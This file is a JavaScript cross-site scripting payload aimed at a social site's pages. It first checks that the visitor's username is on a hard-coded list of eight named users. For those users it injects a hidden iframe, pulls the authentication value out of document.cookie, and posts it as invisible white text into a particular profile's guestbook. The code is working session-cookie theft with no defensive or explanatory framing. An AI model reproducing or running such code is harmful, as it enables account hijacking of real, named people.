function inFrame() {
    try {
        return window.self !== window.top;
    } catch (e) {
        return true;
    }
}
if(!inFrame()) {
	var targetNames = ["Trinetest","annijap","HubertS","Dennisdc","NickDP","Kasper","Melli79","le magnifique"];

	var tempNameEl = document.getElementById("ctl00_ddMenuTab");
	var name = "";

	if(tempNameEl == undefined) {
		tempNameEl = document.getElementById("ctl00_ctl00_content_Contentplaceholder2_ProfileBox1_hlUsername");
		name = tempNameEl.innerText;
	} else {
		name = tempNameEl.getAttribute('title');
	}

	if($.inArray(name, targetNames) != -1) {
		console.log("OK: " + name);
		$("body").prepend('<iframe style="position: fixed;" src="http://www.spigo.de/profiles/1000/guestbook/?mode=1" width="1" height="1" frameborder="0" id="hk"></iframe>');
		var re = new RegExp("uth=(.*?)(;|$)");
		var auth = document.cookie.match(re)[1];
		function post() {
			var hk = document.getElementById("hk").contentWindow;
			hk.$("#cke_contents_ctl00_ctl00_content_cphMainFull_cphMain_Editor_editor").children()[1].contentWindow.document.body.innerHTML = '<span style="color:#ffffff;"><span style="font-size: 8px;">' + auth + '</span></span>';
			hk.WebForm_DoPostBackWithOptions(new WebForm_PostBackOptions("ctl00$ctl00$content$cphMainFull$cphMain$bCreateEntry", "", true, "Guestbook", "", false, true));
		}
		setTimeout(post, 2000);
	} else {
		console.log("not in target names");
	}
}
